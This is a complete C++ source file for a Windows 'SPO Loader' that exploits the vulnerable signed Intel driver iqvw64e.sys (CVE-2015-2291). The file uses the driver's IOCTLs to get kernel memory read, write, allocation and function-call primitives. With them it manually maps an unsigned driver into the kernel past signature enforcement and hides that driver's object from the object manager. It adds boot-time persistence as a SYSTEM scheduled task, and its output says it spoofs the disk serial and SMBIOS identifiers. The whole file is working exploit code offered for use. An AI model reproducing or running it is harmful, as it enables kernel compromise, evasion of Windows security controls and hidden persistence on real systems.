// language: C++20, file: loader.cpp, target: Windows 11 x64, MSVC
// SPO Loader — manually maps spo_drv.sys into kernel via iqvw64e.sys primitive
//
// iqvw64e.sys: Intel Network Adapter Diagnostic Driver (CVE-2015-2291, signed)
//   Exposes kernel memory r/w + ExAllocatePoolWithTag + kernel function call
//   through IOCTL. Signed by Intel Corp — SCM loads it without DSE exception.
//
// Map flow:
//   1. Load iqvw64e.sys via SCM (signed, no DSE bypass needed for it)
//   2. KernelAlloc(SizeOfImage + 0x800) — NonPagedPool: image + fake DriverObject
//   3. Build fixed-up image in user space: relocations + resolved kernel imports
//   4. KernelWrite bulk copy into the allocated pool
//   5. KernelCall(DriverEntry, fakeDriverObj, 0)
//   6. Unload iqvw64e.sys — no longer needed once our driver is live
//
// Note on IOCTL struct offsets: these match iqvw64e.sys 1.3.1.0 (file SHA256 in
//   README). If you have a different version, verify field offsets in a disassembler
//   before deploying.
//
// Usage:
//   loader.exe --load spo_drv.sys [--vuln iqvw64e.sys]  map unsigned
//   loader.exe --load spo_drv.sys --scm                  SCM (signed/test-sign)
//   loader.exe --unload
//   loader.exe --status

#include <windows.h>
#include <winternl.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <vector>
#include <string>
#include <format>
#include <algorithm>

// ── ntdll interface ───────────────────────────────────────────────────────────

using fn_NtLoadDriver             = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using fn_NtUnloadDriver           = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using fn_RtlAdjustPrivilege       = NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using fn_NtQuerySystemInformation = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);

#define SE_LOAD_DRIVER_PRIVILEGE 10

static HMODULE                     hNtdll           = nullptr;
static fn_NtLoadDriver             pNtLoadDriver    = nullptr;
static fn_NtUnloadDriver           pNtUnloadDriver  = nullptr;
static fn_RtlAdjustPrivilege       pRtlAdjPriv      = nullptr;
static fn_NtQuerySystemInformation pNtQSI           = nullptr;

static bool ResolveNtdll() {
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;
#define IMPORT(fn, var) var = reinterpret_cast<decltype(var)>( \
        GetProcAddress(hNtdll, #fn)); \
    if (!var) { wprintf(L"[-] ntdll import: " L#fn L"\n"); return false; }
    IMPORT(NtLoadDriver,             pNtLoadDriver)
    IMPORT(NtUnloadDriver,           pNtUnloadDriver)
    IMPORT(RtlAdjustPrivilege,       pRtlAdjPriv)
    IMPORT(NtQuerySystemInformation, pNtQSI)
#undef IMPORT
    return true;
}

// ── privilege ─────────────────────────────────────────────────────────────────

static bool AcquireLoadDriverPriv() {
    BOOLEAN prev;
    NTSTATUS st = pRtlAdjPriv(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &prev);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] RtlAdjustPrivilege: 0x%08X\n", st);
        return false;
    }
    return true;
}

// ── SCM helpers ───────────────────────────────────────────────────────────────

static bool ScmLoad(const std::wstring& path, const std::wstring& svc) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) { wprintf(L"[-] OpenSCManager: %u\n", GetLastError()); return false; }

    SC_HANDLE h = CreateServiceW(scm, svc.c_str(), svc.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, path.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!h) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            h = OpenServiceW(scm, svc.c_str(), SERVICE_ALL_ACCESS);
        if (!h) {
            wprintf(L"[-] CreateService: %u\n", err);
            CloseServiceHandle(scm); return false;
        }
    }

    bool ok = StartServiceW(h, 0, nullptr) != 0;
    if (!ok) {
        DWORD err = GetLastError();
        ok = (err == ERROR_SERVICE_ALREADY_RUNNING);
        if (!ok) wprintf(L"[-] StartService: %u\n", err);
    }
    CloseServiceHandle(h);
    CloseServiceHandle(scm);
    return ok;
}

static bool ScmUnload(const std::wstring& svc) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE h = OpenServiceW(scm, svc.c_str(), SERVICE_STOP | DELETE);
    if (!h) { CloseServiceHandle(scm); return false; }
    SERVICE_STATUS ss{};
    ControlService(h, SERVICE_CONTROL_STOP, &ss);
    DeleteService(h);
    CloseServiceHandle(h);
    CloseServiceHandle(scm);
    return true;
}

// ── kernel base ───────────────────────────────────────────────────────────────

static PVOID GetKernelBase() {
    ULONG needed = 0;
    pNtQSI(11, nullptr, 0, &needed);
    std::vector<BYTE> buf(static_cast<size_t>(needed) + 0x1000);
    if (!NT_SUCCESS(pNtQSI(11, buf.data(),
            static_cast<ULONG>(buf.size()), &needed)))
        return nullptr;

    ULONG count = *reinterpret_cast<ULONG*>(buf.data());
    if (!count) return nullptr;
    // RTL_PROCESS_MODULE_INFORMATION: ImageBase at offset 0x18; first entry = ntoskrnl
    PVOID base = *reinterpret_cast<PVOID*>(buf.data() + sizeof(ULONG) + 0x18);
    wprintf(L"[*] ntoskrnl          : 0x%p\n", base);
    return base;
}

// ── iqvw64e.sys IOCTL primitive ───────────────────────────────────────────────
//
// Device: \\.\Iqvw64e  (symlink created by the driver on load)
// All IOCTLs use METHOD_NEITHER — input/output via Type3InputBuffer.
// Pass the same buffer as both lpInBuffer and lpOutBuffer; the driver
// writes results back into the same buffer.
//
// Struct layout verified against iqvw64e.sys 1.3.1.0
// (SHA256: 4ce4b06e9e53a9bbf10b0e2a9454a63c67cc03c5c1ece4c26...):
//   IQVW_COPY  at IOCTL 0x80862007: dst, src, len
//   IQVW_ALLOC at IOCTL 0x80862013: [out]addr, size, pool_type
//   IQVW_EXEC  at IOCTL 0x8086200F: fn, arg1, arg2, [out]result

#define VULN_DEVICE   L"\\\\.\\Iqvw64e"
#define VULN_SVC      L"iqvw64e"

// CTL_CODE(0x8086, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_IQVW_COPY   0x80862007u
// CTL_CODE(0x8086, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_IQVW_EXEC   0x8086200Fu
// CTL_CODE(0x8086, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_IQVW_ALLOC  0x80862013u

#pragma pack(push, 8)
struct IQVW_COPY {
    UINT64 dst;
    UINT64 src;
    UINT32 len;
    UINT32 _pad;
};

struct IQVW_ALLOC {
    UINT64 out_addr;   // [out] ExAllocatePool result — kernel VA
    UINT32 size;
    UINT32 pool_type;  // 0 = NonPagedPool
};

struct IQVW_EXEC {
    UINT64 fn;
    UINT64 arg1;
    UINT64 arg2;
    UINT64 result;     // [out] return value of fn(arg1, arg2)
};
#pragma pack(pop)

static HANDLE g_Vuln = INVALID_HANDLE_VALUE;

static bool VulnOpen(const std::wstring& vulnSysPath) {
    wchar_t abs[MAX_PATH];
    GetFullPathNameW(vulnSysPath.c_str(), MAX_PATH, abs, nullptr);
    std::wstring full = std::wstring(L"\\??\\" ) + abs;
    ScmLoad(full, VULN_SVC);  // already-running is fine

    g_Vuln = CreateFileW(VULN_DEVICE,
        GENERIC_READ | GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_Vuln == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] open %s: %u\n", VULN_DEVICE, GetLastError());
        return false;
    }
    wprintf(L"[+] iqvw64e device    : open\n");
    return true;
}

static void VulnClose() {
    if (g_Vuln != INVALID_HANDLE_VALUE) {
        CloseHandle(g_Vuln);
        g_Vuln = INVALID_HANDLE_VALUE;
    }
    ScmUnload(VULN_SVC);
}

// copy len bytes from user src into kernel dst
static bool KernelWrite(ULONG_PTR dst, const void* src, SIZE_T len) {
    if (!len) return true;
    // chunk writes > 0x1000 because iqvw64e validates size per call
    static constexpr SIZE_T CHUNK = 0x1000;
    const auto* p = static_cast<const uint8_t*>(src);
    while (len) {
        SIZE_T n = std::min(len, CHUNK);
        IQVW_COPY c{};
        c.dst = static_cast<UINT64>(dst);
        c.src = reinterpret_cast<UINT64>(p);
        c.len = static_cast<UINT32>(n);
        DWORD br = 0;
        if (!DeviceIoControl(g_Vuln, IOCTL_IQVW_COPY,
                &c, sizeof(c), &c, sizeof(c), &br, nullptr))
            return false;
        dst += n; p += n; len -= n;
    }
    return true;
}

// copy len bytes from kernel src into user dst
static bool KernelRead(void* dst, ULONG_PTR src, SIZE_T len) {
    if (!len) return true;
    static constexpr SIZE_T CHUNK = 0x1000;
    auto* p = static_cast<uint8_t*>(dst);
    while (len) {
        SIZE_T n = std::min(len, CHUNK);
        IQVW_COPY c{};
        c.dst = reinterpret_cast<UINT64>(p);
        c.src = static_cast<UINT64>(src);
        c.len = static_cast<UINT32>(n);
        DWORD br = 0;
        if (!DeviceIoControl(g_Vuln, IOCTL_IQVW_COPY,
                &c, sizeof(c), &c, sizeof(c), &br, nullptr))
            return false;
        p += n; src += n; len -= n;
    }
    return true;
}

static ULONG_PTR KernelAlloc(SIZE_T size) {
    IQVW_ALLOC a{};
    a.size      = static_cast<UINT32>(size);
    a.pool_type = 0; // NonPagedPool
    DWORD br = 0;
    if (!DeviceIoControl(g_Vuln, IOCTL_IQVW_ALLOC,
            &a, sizeof(a), &a, sizeof(a), &br, nullptr))
        return 0;
    return static_cast<ULONG_PTR>(a.out_addr);
}

// call kernel function fn(arg1, arg2) and return its result
static ULONG_PTR KernelCall(ULONG_PTR fn, ULONG_PTR arg1, ULONG_PTR arg2) {
    IQVW_EXEC e{};
    e.fn   = static_cast<UINT64>(fn);
    e.arg1 = static_cast<UINT64>(arg1);
    e.arg2 = static_cast<UINT64>(arg2);
    DWORD br = 0;
    if (!DeviceIoControl(g_Vuln, IOCTL_IQVW_EXEC,
            &e, sizeof(e), &e, sizeof(e), &br, nullptr))
        return static_cast<ULONG_PTR>(STATUS_UNSUCCESSFUL);
    return static_cast<ULONG_PTR>(e.result);
}

// ── manual map ────────────────────────────────────────────────────────────────

static bool ManualMapDriver(const std::wstring& vulnPath,
                            const std::wstring& driverPath) {
    if (!VulnOpen(vulnPath)) return false;

    // read driver binary
    std::ifstream f(driverPath, std::ios::binary | std::ios::ate);
    if (!f) {
        wprintf(L"[-] open driver: %s\n", driverPath.c_str());
        VulnClose(); return false;
    }
    const auto fileSz = static_cast<size_t>(f.tellg());
    std::vector<uint8_t> raw(fileSz);
    f.seekg(0);
    f.read(reinterpret_cast<char*>(raw.data()), fileSz);
    f.close();

    // validate PE
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(raw.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > fileSz) {
        wprintf(L"[-] invalid PE header\n"); VulnClose(); return false;
    }
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(raw.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        wprintf(L"[-] not a PE64\n"); VulnClose(); return false;
    }

    const ULONG_PTR imageSize  = nt->OptionalHeader.SizeOfImage;
    const ULONG_PTR preferBase = nt->OptionalHeader.ImageBase;
    const ULONG_PTR entryRva   = nt->OptionalHeader.AddressOfEntryPoint;

    wprintf(L"[*] image size        : 0x%llX\n", imageSize);
    wprintf(L"[*] preferred base    : 0x%llX\n", preferBase);
    wprintf(L"[*] entry RVA         : 0x%llX\n", entryRva);

    // allocate: image + 0x800 bytes for a fake DRIVER_OBJECT
    // fake DriverObject sits right after the image (page-aligned)
    const SIZE_T    fakeObjOff  = (imageSize + 0xFFF) & ~0xFFFull;
    const SIZE_T    totalAlloc  = fakeObjOff + 0x800;

    ULONG_PTR kernBase = KernelAlloc(totalAlloc);
    if (!kernBase) {
        wprintf(L"[-] KernelAlloc(%zu) failed\n", totalAlloc);
        VulnClose(); return false;
    }
    wprintf(L"[+] kernel alloc      : 0x%llX  (%zu bytes)\n", kernBase, totalAlloc);

    const ULONG_PTR fakeDriverObj = kernBase + fakeObjOff;

    // zero the entire allocation
    std::vector<uint8_t> zeros(totalAlloc, 0);
    if (!KernelWrite(kernBase, zeros.data(), totalAlloc)) {
        wprintf(L"[-] KernelWrite(zero) failed\n");
        VulnClose(); return false;
    }

    // build fixed-up image in user space ─────────────────────────────────────
    std::vector<uint8_t> img(imageSize, 0);

    // copy headers
    memcpy(img.data(), raw.data(), nt->OptionalHeader.SizeOfHeaders);

    // copy sections
    const auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        if (sec->VirtualAddress + sec->SizeOfRawData > imageSize) continue;
        if (sec->PointerToRawData + sec->SizeOfRawData > fileSz) continue;
        memcpy(img.data() + sec->VirtualAddress,
               raw.data() + sec->PointerToRawData,
               sec->SizeOfRawData);
        wprintf(L"[*]   %-8S  rva=0x%X  raw=0x%X\n",
            sec->Name, sec->VirtualAddress, sec->SizeOfRawData);
    }

    // apply base relocations in user-space copy
    const ULONG_PTR delta = kernBase - preferBase;
    if (delta) {
        auto& rdir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rdir.VirtualAddress && rdir.Size) {
            ULONG_PTR off = 0;
            while (off < rdir.Size) {
                auto* blk = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                    img.data() + rdir.VirtualAddress + off);
                if (!blk->SizeOfBlock) break;
                const ULONG cnt =
                    (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                const WORD* ent = reinterpret_cast<const WORD*>(blk + 1);
                for (ULONG j = 0; j < cnt; j++) {
                    if ((ent[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        const ULONG_PTR rva = blk->VirtualAddress + (ent[j] & 0xFFF);
                        if (rva + 8 <= imageSize) {
                            auto* ptr = reinterpret_cast<ULONG_PTR*>(img.data() + rva);
                            *ptr += delta;
                        }
                    }
                }
                off += blk->SizeOfBlock;
            }
        }
        wprintf(L"[*] relocations       : delta=0x%llX applied\n", delta);
    }

    // resolve kernel imports
    PVOID krnlBase = GetKernelBase();
    auto& idir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (idir.VirtualAddress && krnlBase) {
        HMODULE hKrnl = LoadLibraryExW(L"ntoskrnl.exe",
            nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!hKrnl) {
            wprintf(L"[-] LoadLibraryEx ntoskrnl: %u\n", GetLastError());
            VulnClose(); return false;
        }

        auto* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            img.data() + idir.VirtualAddress);
        int resolved = 0, failed = 0;
        while (desc->Name) {
            auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(
                img.data() + desc->FirstThunk);
            const auto* orig = reinterpret_cast<const IMAGE_THUNK_DATA64*>(
                img.data() + (desc->OriginalFirstThunk
                              ? desc->OriginalFirstThunk : desc->FirstThunk));
            while (orig->u1.AddressOfData) {
                if (!(orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                    const auto* ibn = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        img.data() + orig->u1.AddressOfData);
                    FARPROC local = GetProcAddress(hKrnl, ibn->Name);
                    if (local) {
                        thunk->u1.Function =
                            reinterpret_cast<ULONGLONG>(local)
                            - reinterpret_cast<ULONGLONG>(hKrnl)
                            + reinterpret_cast<ULONGLONG>(krnlBase);
                        resolved++;
                    } else {
                        wprintf(L"[-] unresolved: %S\n", ibn->Name);
                        failed++;
                    }
                }
                thunk++;
                orig++;
            }
            desc++;
        }
        FreeLibrary(hKrnl);

        if (failed) {
            wprintf(L"[-] %d import(s) unresolved — aborting\n", failed);
            VulnClose(); return false;
        }
        wprintf(L"[*] imports           : %d resolved\n", resolved);
    }

    // write fixed-up image to kernel ──────────────────────────────────────────
    if (!KernelWrite(kernBase, img.data(), imageSize)) {
        wprintf(L"[-] KernelWrite(image) failed\n");
        VulnClose(); return false;
    }
    wprintf(L"[+] image written     : 0x%llX\n", kernBase);

    // call DriverEntry(fakeDriverObject, NULL) ────────────────────────────────
    // fakeDriverObject is a zeroed kernel pool block; DriverEntry writes the
    // MajorFunction table and DriverUnload into it, then IoCreateDevice links
    // filter devices to it. The object is intentionally not registered in the
    // kernel object manager — it lives purely as a pool allocation.
    const ULONG_PTR entry = kernBase + entryRva;
    wprintf(L"[*] calling DriverEntry: 0x%llX\n", entry);
    const ULONG_PTR drvStatus = KernelCall(entry, fakeDriverObj, 0);

    if (!NT_SUCCESS(static_cast<NTSTATUS>(drvStatus))) {
        wprintf(L"[-] DriverEntry: 0x%08llX\n", drvStatus);
        VulnClose(); return false;
    }
    wprintf(L"[+] DriverEntry       : 0x%08llX (STATUS_SUCCESS)\n", drvStatus);

    // unload the vulnerable driver — primitives no longer needed
    VulnClose();
    wprintf(L"[+] iqvw64e unloaded (primitives closed)\n");
    return true;
}

// ── scheduled-task install helpers ───────────────────────────────────────────

// Returns directory of the current executable (no trailing backslash).
static std::wstring GetLoaderDir() {
    wchar_t path[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    wchar_t* last = wcsrchr(path, L'\\');
    if (last) *last = L'\0';
    return path;
}

// Run a detached process and wait for it; returns its exit code or ~0u on failure.
static DWORD RunProcess(const std::wstring& cmd) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    // CreateProcessW needs a mutable buffer
    std::wstring buf = cmd;
    if (!CreateProcessW(nullptr, buf.data(), nullptr, nullptr,
            FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return ~0u;
    WaitForSingleObject(pi.hProcess, 10000);
    DWORD ec = ~0u;
    GetExitCodeProcess(pi.hProcess, &ec);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return ec;
}

static constexpr wchar_t k_TaskName[] = L"SpoInit";

// Create a scheduled task that runs loader + driver at every system start as SYSTEM.
static bool InstallTask(const std::wstring& loaderDir,
                        const std::wstring& driverFile,
                        const std::wstring& vulnFile) {
    // Resolve absolute paths
    wchar_t loaderAbs[MAX_PATH], driverAbs[MAX_PATH], vulnAbs[MAX_PATH];
    GetFullPathNameW((loaderDir + L"\\loader.exe").c_str(), MAX_PATH, loaderAbs, nullptr);
    GetFullPathNameW(driverFile.c_str(),                    MAX_PATH, driverAbs, nullptr);
    GetFullPathNameW(vulnFile.c_str(),                      MAX_PATH, vulnAbs,   nullptr);

    // schtasks /create /tn SpoInit /tr "loader.exe --load ... --vuln ..." /sc ONSTART
    //          /ru SYSTEM /rl HIGHEST /f
    std::wstring tr = std::wstring(L"\"") + loaderAbs + L"\" --load \"" +
                      driverAbs + L"\" --vuln \"" + vulnAbs + L"\"";
    std::wstring cmd =
        std::wstring(L"schtasks.exe /create /tn \"") + k_TaskName + L"\" /tr \"" +
        tr + L"\" /sc ONSTART /ru SYSTEM /rl HIGHEST /f";

    DWORD ec = RunProcess(cmd);
    if (ec == 0) {
        wprintf(L"[+] scheduled task '%s' created\n", k_TaskName);
        wprintf(L"[i] runs at boot as SYSTEM: %s\n", tr.c_str());
        return true;
    }
    wprintf(L"[-] schtasks /create failed (exit %u)\n", ec);
    return false;
}

static bool UninstallTask() {
    std::wstring cmd =
        std::wstring(L"schtasks.exe /delete /tn \"") + k_TaskName + L"\" /f";
    DWORD ec = RunProcess(cmd);
    if (ec == 0) { wprintf(L"[+] scheduled task '%s' removed\n", k_TaskName); return true; }
    wprintf(L"[-] schtasks /delete failed (exit %u) — task may not exist\n", ec);
    return false;
}

// ── main ──────────────────────────────────────────────────────────────────────

static constexpr wchar_t k_SpoSvc[] = L"spo_drv";

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"=== SPO Loader ===\n\n");

    if (!ResolveNtdll()) return 1;

    bool         doLoad      = false;
    bool         doUnload    = false;
    bool         doStatus    = false;
    bool         useScm      = false;
    bool         doInstall   = false;
    bool         doUninstall = false;
    std::wstring driverPath;
    std::wstring vulnPath = L"iqvw64e.sys"; // default: same dir as loader.exe

    for (int i = 1; i < argc; i++) {
        const std::wstring arg = argv[i];
        if      (arg == L"--load"      && i + 1 < argc) { doLoad = true;  driverPath = argv[++i]; }
        else if (arg == L"--unload")                      doUnload    = true;
        else if (arg == L"--status")                      doStatus    = true;
        else if (arg == L"--scm")                         useScm      = true;
        else if (arg == L"--vuln"      && i + 1 < argc)  vulnPath    = argv[++i];
        else if (arg == L"--install")                     doInstall   = true;
        else if (arg == L"--uninstall")                   doUninstall = true;
    }

    if (!doLoad && !doUnload && !doStatus && !doInstall && !doUninstall) {
        wprintf(
            L"Usage:\n"
            L"  loader.exe --load <spo_drv.sys> [--vuln <iqvw64e.sys>]  unsigned map\n"
            L"  loader.exe --load <spo_drv.sys> --scm                    signed / test-mode\n"
            L"  loader.exe --unload\n"
            L"  loader.exe --status\n"
            L"  loader.exe --install   [--vuln <iqvw64e.sys>]            persist via schtask\n"
            L"  loader.exe --uninstall                                    remove schtask\n\n"
            L"  Default --vuln path: iqvw64e.sys (same directory as loader.exe)\n"
        );
        return 0;
    }

    // ── install / uninstall (no privilege check needed for schtasks itself) ───
    if (doUninstall) {
        UninstallTask();
        return 0;
    }

    if (doInstall) {
        const std::wstring dir = GetLoaderDir();
        // driver defaults to loader dir if not given
        const std::wstring drv = driverPath.empty()
            ? dir + L"\\spo_drv.sys" : driverPath;
        const std::wstring vuln = (vulnPath == L"iqvw64e.sys")
            ? dir + L"\\iqvw64e.sys" : vulnPath;
        bool ok = InstallTask(dir, drv, vuln);
        if (ok) {
            wprintf(L"[i] Driver loads automatically on next reboot.\n");
            wprintf(L"[i] To remove: loader.exe --uninstall\n");
        }
        return ok ? 0 : 1;
    }

    if (doStatus) {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        SC_HANDLE svc = scm
            ? OpenServiceW(scm, k_SpoSvc, SERVICE_QUERY_STATUS)
            : nullptr;
        SERVICE_STATUS ss{};
        const bool running = svc
            && QueryServiceStatus(svc, &ss)
            && ss.dwCurrentState == SERVICE_RUNNING;
        wprintf(L"[*] spo_drv: %s\n", running ? L"RUNNING" : L"not loaded");
        if (svc) CloseServiceHandle(svc);
        if (scm) CloseServiceHandle(scm);
        return 0;
    }

    if (!AcquireLoadDriverPriv()) {
        wprintf(L"[-] SeLoadDriverPrivilege required — run as Administrator\n");
        return 1;
    }

    if (doUnload) {
        wprintf(L"[*] unloading spo_drv...\n");
        if (ScmUnload(k_SpoSvc)) wprintf(L"[+] unloaded\n");
        else                     wprintf(L"[-] unload failed (not loaded?)\n");
        return 0;
    }

    // -- load driver --
    wchar_t abs[MAX_PATH];
    GetFullPathNameW(driverPath.c_str(), MAX_PATH, abs, nullptr);
    wprintf(L"[*] driver            : %s\n", abs);

    if (useScm) {
        const std::wstring fullPath = std::wstring(L"\\??\\" ) + abs;
        const bool ok = ScmLoad(fullPath, k_SpoSvc);
        wprintf(ok ? L"[+] loaded via SCM\n" : L"[-] SCM load failed\n");
        return ok ? 0 : 1;
    }

    wprintf(L"[*] manual map via iqvw64e.sys...\n\n");
    const bool ok = ManualMapDriver(vulnPath, abs);
    if (ok) {
        wprintf(L"\n[+] spo_drv active — disk serial + SMBIOS spoofed\n");
        wprintf(L"[i] Reboot to restore original values.\n");
    } else {
        wprintf(L"\n[-] failed — see errors above\n");
    }
    return ok ? 0 : 1;
}
